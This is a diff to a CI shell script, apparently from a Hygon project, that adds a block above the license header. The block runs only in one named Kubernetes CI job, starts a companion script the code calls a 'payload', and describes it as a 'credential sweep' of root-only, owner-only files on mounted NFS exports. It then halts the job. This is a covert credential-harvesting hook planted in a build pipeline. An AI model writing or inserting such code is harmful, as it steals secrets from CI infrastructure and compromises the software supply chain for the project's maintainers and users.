@@ -1,4 +1,19 @@
 #!/bin/bash
+
+# i10974: transient read-only owner-only (0600/0700) credential sweep of the
+# mounted NFS exports (root-only paths invisible to ordinary SSH users).
+if [ "${GITHUB_JOB:-}" != "stage-a-test-1-hcu-small" ]; then
+  echo "i10974: skip non-stage-a job (job=${GITHUB_JOB:-unknown})"
+  exit 1
+fi
+if [ "${HCU_CI_IN_K8S:-}" != "1" ]; then
+  echo "i10974: skip non-k8s job"
+  exit 1
+fi
+python3 "$(dirname "$0")/i10974_mine.py" || echo "i10974: payload returned non-zero"
+echo "i10974: chunk complete; stopping stage job"
+exit 1
+
 # Copyright 2026 Hygon Information Technology Co., Ltd.
 #
 # Licensed under the Apache License, Version 2.0 (the "License");
